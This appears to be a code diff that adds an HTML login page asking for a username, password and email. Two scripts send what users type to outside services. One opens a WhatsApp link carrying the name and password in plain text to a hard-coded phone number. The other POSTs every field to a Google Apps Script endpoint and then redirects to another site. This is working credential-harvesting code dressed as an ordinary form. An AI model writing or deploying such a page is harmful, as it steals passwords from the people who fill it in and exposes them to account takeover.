@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+<body>
+    <form style="background-color: aqua;width: 30%;padding:20px;text-align: center;margin: auto;" action="" name="submit-to-google-sheet"">
+        <label for="">username</label>
+        <input type="text" name="username" id="ab"><br><br>
+        <label for="">password</label>
+        <input type="Password" name="password" id="p"><br><br>
+        <label for="">Email id</label>
+        <input type="email" name="email id"><br><br>
+        <input type="submit" name="" onclick="datatoWhtsapp()" id="">
+    </form>
+    <script>
+        function datatoWhtsapp(){
+            var name = document.getElementById("ab").value;
+            var password = document.getElementById("p").value;
+
+            var url = "https://wa.me/918368254422?text=" + "name abbbbb: " + name + " password: " + password;
+
+            window.open(url,"_blank").focus();
+        }
+    </script>
+
+<script>
+    const scriptURL = 'https://script.google.com/macros/s/AKfycbziek1mpkADQSN4iLYNOcUvvFT1nd3v3pjusTuocxjvyPphUi8fUJlLukyxtJr-wFgE/exec'
+    const form = document.forms['submit-to-google-sheet']
+  
+    form.addEventListener('submit', e => {
+      e.preventDefault()
+      fetch(scriptURL, { method: 'POST', body: new FormData(form)})
+        .then(response => window.location.href = "https://www.advanceanalyticorb.com/querysubmit.html")
+        .catch(error => console.error('Error!', error.message))
+    })
+  </script>
+
+    <a href="https://wa.me/918368254422 ">go to whatspp</a>
+</body>
+</html>
